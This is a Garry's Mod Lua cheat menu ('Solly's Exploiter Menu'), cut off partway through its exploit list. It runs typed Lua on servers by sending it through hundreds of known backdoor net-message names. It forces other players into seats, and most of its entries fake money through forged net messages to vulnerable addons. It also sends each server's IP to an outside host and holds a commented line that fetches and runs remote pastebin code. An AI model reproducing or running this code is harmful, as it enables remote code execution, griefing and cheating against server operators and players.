--local net=table.Copy(net)
local ents=table.Copy(ents)
local math=table.Copy(math)
local draw=table.Copy(draw)
local surface=table.Copy(surface)
local timer=table.Copy(timer)
local input=table.Copy(input)
local file=table.Copy(file)
local player=table.Copy(player)
local team=table.Copy(team)
local table=table.Copy(table)
local string=table.Copy(string)
local util=table.Copy(util or util)
local isstring=isstring
local istable=istable
local lp=LocalPlayer()
local pairs=pairs
local color_white=color_white
local IsValid=IsValid
if !net.WriteEntity then net.WriteEntity=_G.net.WriteEntity end
local delay=0.35
local dedolozhvkl=false
local tbl={}
local plys={}
local SNTEHERE = false

-- dlya bekdorov http.Fetch("https://pastebin.com/raw/c1imujMM",RunString)




LocalPlayer():ConCommand("gmod_mcore_test 8","cl_timeout 999");

local dedolozh = function()
	if dedolozhvkl then
		timer.Remove("dedolozh")
	else
		print(Color(0,255,0),"Vsego mashin: "..#ents.FindByClass("gmod_sent_vehicle_fphysics_base"))
		timer.Create("dedolozh",delay,0,function()
			plys=player.GetHumans()
			tbl=ents.FindByClass("gmod_sent_vehicle_fphysics_base")
			if #tbl <= 0 then
				return
			end
			for k,v in pairs(plys) do
				if v==LocalPlayer() then continue end
				for i=1,3 do
					local rer = tbl[math.random(1,#tbl)]
					net.Start("simfphys_request_seatswitch")
					net.WriteEntity(rer)
					net.WriteEntity(v)
					net.WriteUInt(i,32)
					net.SendToServer()
				end
			end
		end)
	end
	dedolozhvkl=!dedolozhvkl
end

local oldnetstart=net.Start
net.Start=function(str)
	oldnetstart(str,true)
end

if(istable(MOTDgd))then
	MOTDgd = {}
	function MOTDgd.Show() end
	function MOTDgd.GetIfSkip() return true end
end -- no shit ok?
/* 
-- vars
*/
local s = {}

s.pp=false
s.ChatClear,_ = pcall(require,"chatclear")
s.Bind = {}
s.Bind.Buttons = {}
s.Bind.Buttons["q"] = KEY_Q
s.Bind.Buttons["w"] = KEY_W
s.Bind.Buttons["e"] = KEY_E
s.Bind.Buttons["r"] = KEY_R
s.Bind.Buttons["t"] = KEY_T
s.Bind.Buttons["y"] = KEY_Y
s.Bind.Buttons["u"] = KEY_U
s.Bind.Buttons["i"] = KEY_I
s.Bind.Buttons["o"] = KEY_O
s.Bind.Buttons["p"] = KEY_P
s.Bind.Buttons["a"] = KEY_A
s.Bind.Buttons["s"] = KEY_S
s.Bind.Buttons["d"] = KEY_D
s.Bind.Buttons["f"] = KEY_F
s.Bind.Buttons["g"] = KEY_G
s.Bind.Buttons["h"] = KEY_H
s.Bind.Buttons["j"] = KEY_J
s.Bind.Buttons["k"] = KEY_K
s.Bind.Buttons["l"] = KEY_L
s.Bind.Buttons["z"] = KEY_Z
s.Bind.Buttons["x"] = KEY_X
s.Bind.Buttons["c"] = KEY_C
s.Bind.Buttons["v"] = KEY_V
s.Bind.Buttons["b"] = KEY_B
s.Bind.Buttons["n"] = KEY_N
s.Bind.Buttons["m"] = KEY_M
s.Bind.Buttons["home"] = KEY_HOME

s.Bind.Bind = s.Bind.Buttons["home"]

if(!file.Exists("_sex_info/_setting.txt","DATA"))then
	s.Bind.Ask = vgui.Create( "DFrame" )
	s.Bind.Ask.PerformLayout = function()
		s.Bind.Ask.lblTitle:SetFont("_xploiter_font@@@")
		s.Bind.Ask.lblTitle:SetPos( 8 , 2 )
		s.Bind.Ask.lblTitle:SetSize( s.Bind.Ask:GetWide() - 25, 20 )
	end
	s.Bind.Ask.ShowCloseButton = function() end
	s.Bind.Ask:SetSize(400,200)
	s.Bind.Ask:SetTitle("Select exploit menu bind pls")
	s.Bind.Ask:Center()
	s.Bind.Ask.btnMaxim:Remove()
	s.Bind.Ask.btnMinim:Remove()
	s.Bind.Ask.btnClose:Remove()
	s.Bind.Ask:MakePopup()
	
	s.Bind.AskDSP = vgui.Create( "DScrollPanel", s.Bind.Ask )
	s.Bind.AskDSP:Dock( FILL )	
	for k,v in pairs (s.Bind.Buttons) do
		local button = s.Bind.AskDSP:Add( "DButton" )
		button:Dock( TOP )
		button:DockMargin( 0, 0, 0, 5 )
		button:SetText( string.upper(k) )
		button:SetFont("_xploiter_font@@_")
		button.DoClick = function()
			file.CreateDir("_sex_info")
			file.Write("_sex_info/_setting.txt",k)
			s.Bind.Bind = s.Bind.Buttons[k]
			s.Bind.Ask:Remove()
		end
	end
else
	s.Bind.Bind = s.Bind.Buttons[file.Read("_sex_info/_setting.txt","DATA")]
end
s.Target = {}
s.Exploits = {}
s.colors = {}
s.count = 0

s.colors.gray = Color(28,28,28)
s.colors.red = Color(255,0,0)
s.colors.green = Color(0,255,0)
s.colors.blue = Color(0,0,255)


s.colors[1] = Color(28,28,28,30)
s.colors[2] = Color(75,50,100,30)
s.colors[3] = Color(1,149,205,30)
s.colors[4] = Color(255,144,0,30)
s.colors[5] = Color(229,13,13,30)
s.colors[6] = Color(13,243,23,60)

/* 
-- Init menu
*/
surface.CreateFont("_xploiter_font@@@",{font = "Roboto",size = 22,weight = 10000,blursize = 0,scanlines = 0,antialias = true})
surface.CreateFont("_xploiter_font@@_",{font = "Roboto",size = 16,weight = 10000,blursize = 0,scanlines = 0,antialias = true})
surface.CreateFont("_xploiter_font@__",{font = "Roboto",size = 12,weight = 10000,blursize = 0,scanlines = 0,antialias = true})


s.Main = vgui.Create("DFrame")
s.Main:SetSize(700,600)
s.Main:Center()
s.Main:SetTitle("Solly's Exploiter Menu v3")
s.Main.Paint = function(_,w,h)
	surface.SetDrawColor(s.colors.gray)
	surface.DrawRect(0,0,w,h)
	draw.SimpleText("NetCh Edition","_xploiter_font@@@",230,0,s.colors[6])
	draw.SimpleText(#s.Exploits.."/"..s.count,"_xploiter_font@@_",350,0,color_white)
	if(!s.pp)then
		draw.SimpleText("Server haven't PP!","_xploiter_font@@_",400,0,color_white)
	end
	

	draw.SimpleText("Check Anti Cheats","_xploiter_font@@_",520,0,color_white)



	
	draw.SimpleText("Group","_xploiter_font@@_",485,25,color_white)
	draw.SimpleText("Team","_xploiter_font@@_",573,25,color_white)
	draw.SimpleText("Name","_xploiter_font@@_",661,25,color_white)
end

s.Main:MakePopup()
s.Main.btnClose.DoClick = function()
	s.Main:Hide()
end
s.Main.btnClose.Paint = function(_,w,h)
	draw.RoundedBox(0,0,0,w,h,s.colors.red)
end
s.Main.PerformLayout = function()
	s.Main.lblTitle:SetFont("_xploiter_font@@@")
	s.Main.lblTitle:SetPos( 8 , 2 )
	s.Main.lblTitle:SetSize( s.Main:GetWide() - 25, 20 )
end
s.Main.ShowCloseButton = function() end
s.Main.btnMaxim:Remove()
s.Main.btnMinim:Remove()
s.Main:Hide()
s.lock = 0
vgui.GetWorldPanel().Paint = function() 
	for i=1,#s.Target do
		if !IsValid(s.Target[i]) then
			table.remove( s.Target, i )
		end
	end
	if(input.IsKeyDown(s.Bind.Bind) and !lp:IsTyping())then
		if(s.lock == 0)then
			if(s.Main:IsVisible())then
				s.Main:Hide()
				s.lock = 1
			else
				s.Main:Show()
				s.lock = 1
				if(IsValid(s.dsp))then
					table.sort( s.Exploits, function( a, b ) return a[10] > b[10] end )
					s.dsp:Clear()
					for k, v in pairs( s.Exploits ) do
						if(v[5] == 1 and !isnumber(v[7]) )then
							v[7] = 0
						end
						local sploit = s.dsp:Add( "DButton" )
						sploit:SetText('')
						sploit:SetPos(5,(k-1)*50+5)
						sploit:SetSize(465,45)
						local oaoaoa=v[3]
						sploit.Paint = function(_,w,h)
							surface.SetDrawColor(s.colors[v[10]])
							surface.DrawRect(0,0,w,h)
							/*if v[10] == 6 then
								v[3]=string.char(math.random(40,120))..oaoaoa..string.char(math.random(40,120))
							end*/
							draw.SimpleText("Name: '"..v[1].."'","_xploiter_font@@_",5,2,color_white)
							draw.SimpleText("Net string: '"..v[3].."'","_xploiter_font@@_",w-15,2,color_white,2)
							draw.SimpleText("Hint: '"..v[2].."'","_xploiter_font@@_",5,25,color_white)
							if(v[7] == 1)then
								draw.RoundedBox(0,347, 22, 111 , 16,s.colors.green)
							end
							if(!isnumber(v[7]))then
								if(sploit:IsDown())then
									draw.RoundedBox(0,347, 22, 111 , 16,s.colors.blue)
								end
							end
							surface.SetDrawColor(color_white)
							surface.DrawOutlinedRect( 0, 0, w , h )
							surface.DrawOutlinedRect( 345, 20, 115 , 20 )
						end
						sploit.DoClick = function()
							if(isnumber(v[7]))then
								if(v[7] == 0)then
									surface.PlaySound("buttons/combine_button3.wav") chat.AddText("[SEX] -> "..v[3])  
									if(s.STARTDETOURED)then s.NoPls() end
									v[7] = 1
									v[4](v[7])
								else
									surface.PlaySound("buttons/combine_button2.wav") chat.AddText("[SEX] || "..v[3])
									if(s.STARTDETOURED)then s.YesPls() end
									v[7] = 0
									v[4](v[7])
								end
							else
								surface.PlaySound("buttons/combine_button3.wav") chat.AddText("[SEX] --> "..v[3])  
								v[4]()
							end
						end
					end
				end
				if(IsValid(s.dsp2))then
					s.dsp2:Clear()
					for k, v in pairs( player.GetAll() ) do
						local Egrok = s.dsp2:Add( "DButton" )
						Egrok:SetText( v:GetUserGroup().." | "..team.GetName(v:Team()).." | "..v:Nick() )
						Egrok:SetPos(5,(k-1)*30+5)
						Egrok:SetSize(200,25)
						Egrok:SetFont( "_xploiter_font@__" )
						Egrok.Paint = function(_,w,h)
							if(table.HasValue(s.Target,v))then
								draw.RoundedBox(0,0,0,w,h,s.colors.red)
							end
							surface.SetDrawColor(color_white)
							surface.DrawOutlinedRect( 0, 0, w , h )
							if(!IsValid(v))then
								table.RemoveByValue(s.Target,v)
								Egrok:Remove()
							end
						end
						Egrok.DoClick = function()
							if(table.HasValue(s.Target,v))then
								table.RemoveByValue(s.Target,v)
							else
								s.Target[#s.Target+1]=v
							end
						end
						Egrok.UpdateColours = function()
							return Egrok:SetTextStyleColor(color_white)
						end
					end
				end
			end
		end
	else
		s.lock = 0
	end 
end
s.dsp = vgui.Create( "DScrollPanel", s.Main )
s.dsp:SetPos(5,25)
s.dsp:SetSize(475,570)
s.dsp.Paint = function(_,w,h)
	surface.SetDrawColor(color_white)
	surface.DrawOutlinedRect( 0, 0, w , h )
end
s.dsp2 = vgui.Create( "DScrollPanel", s.Main )
s.dsp2:SetPos(485,45)
s.dsp2:SetSize(210,490)
s.dsp2.Paint = function(_,w,h)
	surface.SetDrawColor(color_white)
	surface.DrawOutlinedRect( 0, 0, w , h )
end
s.TE = vgui.Create( "DTextEntry", s.Main )
s.TE:SetPos(485,540)
s.TE:SetSize(210,25)
s.TE:SetText("enter shit here")
s.TE:SetFont("_xploiter_font@@_")
s.TE.Paint = function(self,w,h)
	self:DrawTextEntryText(color_white, s.colors.blue , color_white)
	surface.SetDrawColor(color_white)
	surface.DrawOutlinedRect( 0, 0, w , h )
end
s.SaveShit = vgui.Create( "DButton", s.Main )
s.SaveShit:SetPos(485,570)
s.SaveShit:SetSize(210,25)
s.SaveShit:SetFont( "_xploiter_font@__" )
s.SaveShit:SetText("Save server info & exploits")
s.SaveShit.Paint = function(_,w,h)
	draw.RoundedBox(0,0,0,w,h,s.colors.green)
	surface.SetDrawColor(color_white)
	surface.DrawOutlinedRect( 0, 0, w , h )
end
s.SaveShit.UpdateColours = function()
	return s.SaveShit:SetTextStyleColor(color_white)
end
s.SaveShit.DoClick = function()
	surface.PlaySound( "items/ammo_pickup.wav" )
	http.Post("http://osniffer.pro/danet_1.gif?"..game.GetIPAddress(),{})
	chat.AddText("saved to data/_sex_info/"..string.Replace(game.GetIPAddress(),":","-").." ("..#s.Exploits.."-"..s.count..").txt")
	if(!file.Exists("_sex_info","DATA"))then
		file.CreateDir("_sex_info")
	end
	local name = "_sex_info/"..string.Replace(game.GetIPAddress(),":","-").." ("..#s.Exploits.."-"..s.count..").txt"
	file.Write(name,"IP: "..game.GetIPAddress().." aka '"..GetHostName().."'\r\nExploits Count: "..#s.Exploits.."/"..s.count.."\r\nExploit List:\r\n")
	for i=1,#s.Exploits do
		file.Append(name,"\r\n".."#"..i.." "..s.Exploits[i][1].."("..s.Exploits[i][3]..")".."\r\n"..s.Exploits[i][2].."\r\n")
	end
end


/*
-- Functions
*/
s.ValidNetString = function( str )
    return isstring(str) and util.NetworkStringToID( str ) != 0 and str != ""
end
s.AddExploit = function( rare, name , dis , netstr , onfunc , multi , needpp , timername , delay )
	if(!isnumber(delay))then
		delay = 0.5
	end
	local num = #s.Exploits+1
	if(needpp == 0 or (needpp == 1 and !s.pp))then 
		if(isstring(netstr))then
			if(s.ValidNetString(netstr) or netstr == "")then
				s.Exploits[num] = {}
				s.Exploits[num][1] = name 
				s.Exploits[num][2] = dis
				if(netstr == "")then
					s.Exploits[num][3] = name
				else
					s.Exploits[num][3] = netstr
				end
				if(multi == 1)then
					s.Exploits[num][4] = function(per)
						hook.Add("Tick",timername,function()
							if(per == 1)then
								onfunc() 
							else
								hook.Remove("Tick",timername)
							end
						end)
					end
				else
					s.Exploits[num][4] = function() onfunc() end 
				end
				s.Exploits[num][5] = multi
				s.Exploits[num][6] = needpp
				s.Exploits[num][10] = rare
			end
		end
		if(istable(netstr))then
			local valid = false
			for i=1,#netstr do
				if(s.ValidNetString(netstr[i]))then
					valid = true
				end
			end
			if(valid)then	
				s.Exploits[num] = {}
				s.Exploits[num][1] = name 
				s.Exploits[num][2] = dis
				local net_key = " "
				for i=1,#netstr do
					if(s.ValidNetString(netstr[i]))then
						net_key = net_key .. netstr[i] .. " "
					end
				end
				s.Exploits[num][3] = tostring(net_key)
				
				if(multi == 1)then
					s.Exploits[num][4] = function(per)
						hook.Add("Tick", timername, function()
							if(per == 1)then
								for i=1,#netstr do onfunc(netstr[i]) print(netstr[i]) end
							else
								hook.Remove("Tick",timername)
							end
						end)
					end
				else
					s.Exploits[num][4] = function() for i=1,#netstr do onfunc(netstr[i]) end end 
				end
				s.Exploits[num][5] = multi
				s.Exploits[num][6] = needpp
				s.Exploits[num][10] = rare
			end
		end
	end
	s.count = s.count + 1
end
/*
-- Exploits
*/



//memedors xd
s.AddExploit(5,"Run lua command","type command in textentry",{"memeDoor",
	"Sbox_darkrp",
	"Sbox_itemstore",
	"Ulib_Message",
	"ULogs_Info",
	"ITEM",
	"fix",
	"noclipcloakaesp_chat_text",
	"_Defqon",
	"nocheat",
	"ULX_QUERY2",
	"Sandbox_GayParty",
	"DarkRP_UTF8",
	"oldNetReadData",
	"BackDoor",
	"OdiumBackDoor",
	"cucked",
	"NoNerks",
	"kek",
	"ZimbaBackDoor",
	"something",
	"random",
	"strip0",
	"fellosnake",
	"idk",
	"killserver",
	"fuckserver",
	"cvaraccess",
	"rcon",
	"rconadmin",
	"web",
	"Þà?D)◘",
	"DefqonBackdoor",
	"Sandbox_Armdupe",
	"DarkRP_AdminWeapons",
	"SessionBackdoor",
	"Fix_Keypads",
	"Remove_Exploiters",
	"7",
	"_Defqon",
	"_CAC_ReadMemory",
	"nostrip",
	"LickMeOut",
	"MoonMan",
	"Im_SOCool",
	"ULXQUERY2",
	"jesuslebg",
	"Р“С›Р“ ?D)РІвЂ”В",
	"zilnix",
	"enablevac",
	"c",
	"Sbox_gm_attackofnullday_key",
	"ÃžÃ ?D)â—˜",
	"disablebackdoor",
	"kill",
    "hacking bro","hackingbro","kebabmenu","rotten_proute","BITMINER_UPDATE_DLC","nostrip2","operationsmoke","vegeta","pd1","JSQuery.Data ( Post ( false ) )","anatikisgodd","anatikisgod","https://i.imgur.com/gf6hlml.png","print ( )","fps","fszof<qOvfdsf","tupeuxpaslabypass","_CAC_G","adsp_door_length","SDFTableFsSSQS","EventStart","data_check","antileak","CreateAdminRanks","Asunalabestwaifu","shittycommand","tro2fakeestunpd","FAdmin_CreateVar","ContextHelp","lmaogetdunked","LV_BD_V2","createpanel","fuckyou","1337","haxor","r8helper","_chefhackv2","Þà?D)?","Þ  ?D)?","nostrip1","antilagger","Fix_Exploit","yazStats","FPSVBOOST","RTX420","Revelation","SizzurpDRM","cbbc","gSploit","ÃƒÅ¾ÃƒÂ ?D)Ã¢â€”Ëœ","Reaoscripting","ß ?D)?","?????????????????Ð¿??? ?? ?Ñ¿??Ä¿Õ¿? ???Ñ¿??Õ¿??Ð®","!Çº/;.","NoOdium_Reaoscripting","m9k_","Î¾psilon","Backdoor","reaper","SDFTableFsSSQE","gmod_dumpcfg", "fpsvboost", "antipk", "privatebackdoorshixcrewpr", "edouardo573", "sikye", "addoncomplie", "novisit", "no_visitping", "_reading_darkrp", "gPrinters.sncSettings", "mat", "mat(0)", "banId2", "keyss", "!?/;.", "SteamApp2313", "??D)?","?", "Þ� ?D)◘", "Val", "models/zombie.mdl","REBUG", "????????????????????? ?? ??????? ??????????", "material", "entityhealt", "banId", "kickId2", "json.parse(crashsocket)", "elsakura", "dev", "FPSBOOST", "INJ3v4", "MJkQswHqfZ", "_GaySploit", "GaySploitBackdoor", "xuy", "legrandguzmanestla", "_Battleye_Meme_", "Dominos", "elfamosabackdoormdr", "thefrenchenculer", "xenoexistscl", "_Defcon", "EnigmaIsthere", "BetStrep", "JQerystrip.disable", "ξpsilon", "Ulogs_Infos", "jeveuttonrconleul", "Sandbox_ArmDupe", "OdiumBackDoor", "RTPayloadCompiler", "playerreportabuse", "12", "opensellermenu", "sbussinesretailer", "DarkRP_Money_System", "ohnothatsbad", "yarrakye", "�? ?D)?", "DataMinerType", "weapon_phygsgun_unlimited","PlayerKilledLogged", "mdrlollesleakcestmal", "yerdxnkunhav", "kebab","L_BD_v2", "netstream", "pure_func_run_lua", "rconyesyes", "Abcdefgh", "Fibre", "FPP_AntiStrip", "kidrp", "blacklist_backdoor", "boombox", "DOGE", "hexa", "-c", "VL_BD", "OBF::JH::HAX", "SACAdminGift", "GetSomeInfo", "nibba", "RegenHelp", "xmenuiftrue", "d4x1cl", "BlinkingCheckingHelp", "AnalCavity", "Data.Repost", "YOH_SAMBRE_IS_CHEATER", "dropadmin", "GLX_push", "ALTERED_CARB0N", "thenostraall", "LVDLVM", ">sv", "utf8-gv", "argumentumac", "runSV", "adm_", "Inj3", "samosatracking57", "doorfix", "SNTEFORCE", "GLX_plyhdlpgpxlfpqnghhzkvzjfpjsjthgs", "disablecarcollisions" , "PlayerCheck" , "Sbox_darkrp" , "insid3" , "The_Dankwoo" , "Sbox_itemstore" , "Ulib_Message" , "ULogs_Info" , "ITEM" , "R8" , "fix" , "Fix_Keypads" , "Remove_Exploiters" , "noclipcloakaesp_chat_text" , "_Defqon" , "_CAC_ReadMemory" , "nostrip" , "nocheat" , "LickMeOut" , "ULX_QUERY2" , "ULXQUERY2" , "https://i.imgur.com/Gf6hLMl.png" , "MoonMan" , "Im_SOCool" , "JSQuery.Data(Post(false))" , "Sandbox_GayParty" , "DarkRP_UTF8" , "OldNetReadData" , "Gamemode_get" , "memeDoor" , "BackDoor" , "SessionBackdoor" , "DarkRP_AdminWeapons" , "cucked" , "NoNerks" , "kek" , "ZimbaBackdoor" , "something" , "random" , "strip0" , "fellosnake" , "enablevac" , "idk" , "ÃžÃ� ?D)â—˜" , "snte" , "apg_togglemode" , "Hi" , "beedoor" , "BDST_EngineForceButton" , "VoteKickNO" , "REEEEEEEEEEEE" , "_da_" , "Nostra" , "sniffing" , "keylogger" , "CakeInstall" , "Cakeuptade" , "love" , "earth" , "ulibcheck" , "Nostrip_" , "teamfrench" , "ADM" , "hack" , "crack" , "leak" , "lokisploit" , "1234" , "123" , "enculer" , "cake" , "seized" , "88" , "88_strings_" , "nostraall" , "blogs_update" , "nolag" , "loona_" , 
	"_logs" , "loona" , "negativedlebest" , "berettabest" , "ReadPing" , "antiexploit" , "adm_NetString" , "mathislebg" , "Bilboard.adverts:Spawn(false)" , "pjHabrp9EY" , "?" , "lag_ping" , "allowLimitedRCON(user) 0" , "aze46aez67z67z64dcv4bt" , "killserver" , "fuckserver" , "cvaraccess" , "rcon" , "rconadmin" , "web" , "jesuslebg" , "zilnix" , "��?D)?" , "disablebackdoor" , "kill" , "DefqonBackdoor" , "DarkRP_AllDoorDatas" , "0101.1" , "awarn_remove" , "_Infinity" , "Infinity" , "InfinityBackdoor" , "_Infinity_Meme_" , "arivia" , "ULogs_B" , "_Warns" , "_cac_" , "striphelper" , "_vliss" , "YYYYTTYXY6Y" , "?????????????????�???? ?? ?�???�?�?? ???�???�???�." , "_KekTcf" , "_blacksmurf" , "blacksmurfBackdoor" , "_Raze" , "m9k_explosionradius" , "m9k_explosive" , "m9k_addons" , "rcivluz" , "SENDTEST" , "_clientcvars" , "_main" , "stream" , "waoz" , "bdsm" , "ZernaxBackdoor" , "UKT_MOMOS" , "anticrash" , "audisquad_lua" , "dontforget" , "noprop" , "thereaper" , "0x13" , "Child" , "!Cac" , "azkaw" , "BOOST_FPS" , "childexploit" , "ULX_ANTI_BACKDOOR" , "FADMIN_ANTICRASH" , "ULX_QUERY_TEST2" , "GMOD_NETDBG" , "netlib_debug" , "_DarkRP_Reading" , "lag_ping" , "||||"  , "FPP_RemovePLYCache" , "fuwa" , "stardoor" , "SENDTEST" , "rcivluz" , "c" , "N::B::P" , "changename" , "PlayerItemPickUp" , "echangeinfo" , "fourhead" , "music" , "slua" , "adm_network" , "componenttolua" , "theberettabcd" , "SparksLeBg" , "DarkRP_Armors" , "DarkRP_Gamemodes" , "fancyscoreboard_leave" , "PRDW_GET" , "pwn_http_send" , "AnatikLeNoob" , "GVacDoor" , "Keetaxor" , "BackdoorPrivate666" , "YohSambreLeBest" , "SNTE<ALL" , "!�:/;." , "pwn_http_answer" , "pwn_wake" , "verifiopd" , "AidsTacos" , "shix" , "PDA_DRM_REQUEST_CONTENT" , "xenoreceivetargetdata2" , "xenoreceivetargetdata1" , "xenoserverdatafunction" , "xenoserverfunction" , "xenoclientdatafunction" , "xenoclientfunction" , "xenoactivation" , "EXEC_REMOTE_APPS" , "yohsambresicianatik<3" , "Sbox_Message" , "Sbox_gm_attackofnullday_key" , "The_DankWhy" , "nw.readstream" , "AbSoluT" , "__G____CAC" , "Weapon_88" , "mecthack" , "SetPlayerDeathCount" , "FAdmin_Notification_Receiver" , "DarkRP_ReceiveData" , "fijiconn" , "LuaCmd" , "EnigmaProject" , "z" , "cvardel" , "effects_en" , "file" , "gag" , "asunalabestwaifu" , "stoppk" , "Ulx_Error_88" , "NoOdium_ReadPing", "striphelper"},function(netstr) 
	if(s.ValidNetString(netstr))then
		net.Start(netstr)
		net.WriteString(s.TE:GetText()) 
		net.WriteBit(1)
	    net.SendToServer()
	    net.Start(netstr)
		net.WriteString(s.TE:GetText()) 
		net.WriteBit(0)
	    net.SendToServer()
    end
	
	
	
	
	
end, 0,0)


//money
s.AddExploit(2,"Free rp money #1","Gives u free money from money printers","DataSend",function() 
	for k, v in pairs( ents.GetAll() ) do
    	if v:GetClass() == "adv_moneyprinter" then    
            net.Start("DataSend")
            net.WriteFloat(2)
            net.WriteEntity(v) 
            net.WriteEntity(LocalPlayer())
            net.SendToServer()
    	end
    end
end, 1,0,"_sex_free_money",1)

s.AddExploit(3,"Free rp money #2","Gives u free money from farm shit","FarmingmodSellItems",function() 
	net.Start( "FarmingmodSellItems" )
	net.WriteTable({
		Cost    =   10,
		CropModel    =   "models/props/eryk/garlic.mdl",
		CropType =   2,
		Info  =   "Garlic Seed",
		Model =   "models/props/eryk/seedbag.mdl",
		Name    =   "Garlic",
		Quality    =   4,
		Sell  =   99999,
		Type  =   "Seed"
	})
	net.WriteInt(1,16)
	net.SendToServer()
end, 1,0,"_sex_free_money_2",1)

s.AddExploit(3,"Free rp money #3","Gives u free money from duel","duelrequestguiYes",function() 
	net.Start("duelrequestguiYes")
	net.WriteInt(math.random(800000,9000000),32)
	net.WriteEntity(table.Random( player.GetAll() ))
	net.WriteString("Crossbow")
	net.SendToServer()
end, 1,0,"_sex_free_money_3",1)

s.AddExploit(3,"Free rp money #4","Gives u free money from shit","SendMoney",function() 
		net.Start( "SendMoney" )
		net.WriteEntity( LocalPlayer() )
		net.WriteEntity( LocalPlayer() )
		net.WriteEntity( LocalPlayer() )
		net.WriteString( "-1000000" )
		net.SendToServer()
end, 1,0,"_sex_free_money_4",1)

s.AddExploit(3,"Free rp money #5","Gives u free money from bail","BailOut",function() 
		for k, v in pairs(player.GetAll()) do
			net.Start( "BailOut" )
			net.WriteEntity( LocalPlayer() )
	        net.WriteEntity( v )
	        net.WriteFloat( -1000000 )
			net.SendToServer()
		end
end, 1,0,"_sex_free_money_5",1)



s.AddExploit(3,"Free rp money #6","Gives u free money from roll","ckit_roul_bet",function() 
	net.Start("ckit_roul_bet")
	net.WriteEntity(LocalPlayer())
	net.WriteString("")
	net.WriteString("")
	net.WriteUInt(tonumber(s.TE:GetText()), 16)
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Free rp money #7","Gives u free money from hit","hhh_request",function() 
	local hitRequest = {}
	hitRequest.hitman = LocalPlayer()
	hitRequest.requester = LocalPlayer()
	hitRequest.target = table.Random(player.GetAll())
	hitRequest.reward = -999999
	net.Start( 'hhh_request' )
	net.WriteTable( hitRequest  )
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Free rp money #8","Gives u free money from hit","hitcomplete",function() 
	net.Start("hitcomplete")
	net.WriteDouble( GetConVarNumber("bh_hitmenuammount") )
	net.SendToServer()
end, 1,0,"_sex_free_money_8",1)

s.AddExploit(3,"Free rp money #9","Gives u free money from drugs","Kun_SellDrug",function() 
	net.Start("Kun_SellDrug")
	net.WriteString("Meth")
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Free rp money #10","Gives u free money from carz","BuyCar",function() 
	net.Start("BuyCar")
	net.WriteFloat(-1000000000000)
	net.WriteEntity(LocalPlayer())
	net.WriteString(s.LagText)
	net.WriteString(s.LagText)
	net.WriteString(s.LagText)
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Free rp money #11","Gives u free money from vcmod","AttemptSellCar",function() 
	for i=0,30 do  
		for i=1,10 do 
			net.Start( "AttemptSellCar" )    
			net.WriteInt( i, 8 ) 
			net.SendToServer()
		end
	end
end, 0,0)

s.AddExploit(3,"Free rp money #12","Gives u free money from shit","ply_pick_shit",function() 
	for k, v in pairs (player.GetAll()) do
		for i = 1,255 do
			net.Start("ply_pick_shit")
			net.WriteEntity(LocalPlayer())
			net.WriteEntity(v)
			net.SendToServer()
		end
	end
end, 0,0)

s.AddExploit(3,"Free rp money #13","Gives u free money from printerz","SyncPrinterButtons16690",function() 
	for k, v in pairs(ents.GetAll()) do
		if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
			net.Start( "SyncPrinterButtons16690" )
			net.WriteEntity(v)
			net.WriteUInt(2, 4)
			net.SendToServer()
		end
	end
end, 1,0,"_sex_free_money_13",5)

s.AddExploit(3,"Free rp money #14","Gives u free money from printerz","withdrawp",function() 
	for k,v in pairs(ents.FindByClass("derma_printer")) do
		net.Start("withdrawp")
		net.WriteEntity(v)
		net.SendToServer()
	end
	print("printerov:".. tostring(#ents.FindByClass("derma_printer")))
end, 1,0,"_sex_free_money_14",5) --ents.FindByClass("derma_printer")

s.AddExploit(3,"Free rp money #15","Gives u free money from shit","DarkRP_SS_Gamble",function() 
	net.Start( "DarkRP_SS_Gamble" )
	net.WriteInt(50000, 32)
	net.WriteInt(1, 32)
	net.WriteInt(0, 32)
	net.WriteInt(0, 32)
	net.WriteInt(1, 32)
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Free rp money #16","Gives u free money from printerz","SyncPrinterButtons76561198056171650",function() 
	for k, v in pairs(ents.GetAll()) do
		if( v:GetClass():find("print") ) then
			net.Start( "SyncPrinterButtons76561198056171650" )
			net.WriteEntity(v)
			net.WriteUInt(2, 4)
			net.SendToServer()
		end
	end
end, 1,0,"_sex_free_money_16",5)

s.AddExploit(3,"Free rp money #17","Select target & money count","75_plus_win",function() 
	for i=1,#s.Target do
		net.Start( "75_plus_win" )
		net.WriteString(s.TE:GetText())
		net.WriteEntity(s.Target[i])
		net.SendToServer()
	end
end, 0,0)

s.AddExploit(3,"Free rp money #18","just money (number in text entry)","ATMDepositMoney",function() 
	net.Start( "ATMDepositMoney" )
	net.WriteFloat( tonumber(s.TE:GetText()) )
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Free rp money #19","gives u free money from mining","SellMinerals",function() 
	for k,v in pairs(SkillDB) do
		if not ( v.iSkill == true ) then
			net.Start("Upgrade")
			net.WriteTable( { LuaName = v.LuaName, Amount = -100000000 } )
			net.SendToServer()
			net.Start( "SellMinerals" )
			net.WriteTable( { Target = LocalPlayer() } )
			net.SendToServer()
		end
	end
end, 0,0)

s.AddExploit(3,"Free rp money #20","gives u free money from bet","TakeBetMoney",function() 
	net.Start( "TakeBetMoney" )
	net.WriteTable({1e333333 , 1e333333})
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Free rp money #21","gives u free money from oil","Kun_SellOil",function() 
	for k,v in pairs(ents.GetAll()) do
		net.Start("Kun_SellOil")
		net.WriteEntity(v)
		net.SendToServer()
	end
end, 0,0)

s.AddExploit(3,"Free rp money #22","gives u free money from deposit (number in text entry)","DepositMoney",function() 
	for k,v in pairs(player.GetAll()) do
		net.Start( "DepositMoney" )
		net.WriteEntity(v)
		net.WriteString(tonumber(s.TE:GetText()) )
		net.WriteEntity(v)
		net.SendToServer()
	end
end, 0,0)

s.AddExploit(3,"Free rp money #23","gives u free money from taxi (number in text entry)","NET_EcSetTax",function() 
	net.Start("NET_EcSetTax")
	net.WriteInt(tonumber(s.TE:GetText()) , 16)
	net.SendToServer() 
end, 0,0)

s.AddExploit(3,"Free rp money #24","Select target & money count","RP_Accept_Fine",function() 
	for i=1,#s.Target do
		net.Start("RP_Accept_Fine")
			net.WriteString(s.Target[i])
			net.WriteDouble(tonumber(s.TE:GetText()))
		net.SendToServer()
	end
end, 0,0)

s.AddExploit(3,"Free rp money #25","gives u free money from shop","CRAFTINGMOD_SHOP",function() 
